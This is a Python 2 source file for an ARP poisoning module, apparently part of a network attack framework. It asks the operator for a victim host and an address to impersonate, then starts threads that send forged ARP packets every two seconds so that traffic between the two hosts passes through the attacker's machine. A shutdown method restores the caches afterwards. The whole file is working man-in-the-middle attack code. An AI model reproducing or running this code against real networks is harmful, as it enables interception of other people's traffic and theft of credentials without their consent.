import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from threading import Thread
from scapy.all import *
from time import sleep
from util import Error, Msg, debug
from poison import Poison
import config
import gc

class arp(Poison):
	"""ARP spoofing class
	"""

	def __init__(self):
		# keep scapy quiet
		conf.verb = 0
		# tuples (ip,mac)
		self.local  = (config.get('ip_addr'), get_if_hwaddr(config.get('iface')))
		self.victim = ()
		self.target = ()
		# flag for spoofing 
		self.spoofing = False
		super(arp,self).__init__('ARP Spoof')

	def initialize(self):
		"""Initialize the ARP spoofer
		"""
		try:
			Msg('[!] Using interface [%s:%s]'%(config.get('iface'), self.local[1]))
			# get ip addresses from user
			to_ip = raw_input("[!] Enter host to poison:\t")
			from_ip = raw_input("[!] Enter address to spoof:\t")
			tmp = raw_input("[!] Spoof IP {0} from victim {1}.  Is this correct? ".format(to_ip, from_ip))

			self.victim = (to_ip, getmacbyip(to_ip))
			self.target = (from_ip, getmacbyip(from_ip))
		except KeyboardInterrupt:
			return None
		except Exception, j:
			debug('Error loading ARP poisoning module: %s'%(j))
			return None
		if "n" in tmp.lower():
			return
		Msg("[!] Initializing ARP poison...")
		return self.initialize_post_spoof()

	def initialize_post_spoof(self):
		""" Separated from mainline initialization so we can run this post-var 
			configuration.  If you're calling this, BE SURE to set up the required
			variables first!
		"""
		try:
			# send ARP replies to victim
			debug('Beginning ARP spoof to victim...')
			victim_thread = Thread(target=self.respoofer, args=(self.target, self.victim))
			victim_thread.start()
			# send ARP replies to spoofed address
			target_thread = Thread(target=self.respoofer, args=(self.victim, self.target))
			target_thread.start()
			self.spoofing = True
		except KeyboardInterrupt:
			Msg('Closing ARP poison down...')
			self.spoofing = False
			return None
		except TypeError, t:
			Error('Type error: %s'%t)
			self.spoofing = False
			return None
		except Exception, j:
			Error('Error with ARP poisoner: %s'%j)
			self.spoofing = False
			return None
		return self.victim[0]
			
	def respoofer(self, target, victim):
		""" Respoof the target every two seconds.
		"""
		try:
			pkt = Ether(dst=target[1],src=self.local[1])/ARP(op="who-has",psrc=victim[0], pdst=target[0])
			while self.spoofing:
				sendp(pkt, iface_hint=target[0])
				time.sleep(2)
		except Exception, j:
			Error('Spoofer error: %s'%j)
			return None
	
	def test_stop(self):
		""" Callback for stopping the sniffer
		"""
		if self.spoofing:
			return False
		debug("Stopping spoof threads..")
		return True
	
	def shutdown(self):
		""" Shutdown the ARP spoofer
		"""
		if not self.spoofing: 
			return
		Msg("Initiating ARP shutdown...")
		debug('initiating ARP shutdown')
		self.spoofing = False
		time.sleep(2) # give it a sec for the respoofer
		# rectify the ARP caches
		sendp(Ether(dst=self.victim[1],src=self.target[1])/ARP(op='who-has', 
								psrc=self.target[0], pdst=self.victim[0]),
						     count=1)
		sendp(Ether(dst=self.target[1],src=self.victim[1])/ARP(op='who-has', 
								psrc=self.victim[0],pdst=self.target[0]),
						     count=1)
		debug('ARP shutdown complete.')
		return True
	
	def session_view(self):
		""" Return the IP we're poisoning
		"""
		return self.victim[0]

	def view(self):
		""" ARP poisoner doesnt have a view, yet.
		"""
		Msg('No view for ARP poison.  Enable a sniffer for detailed analysis.')
		return
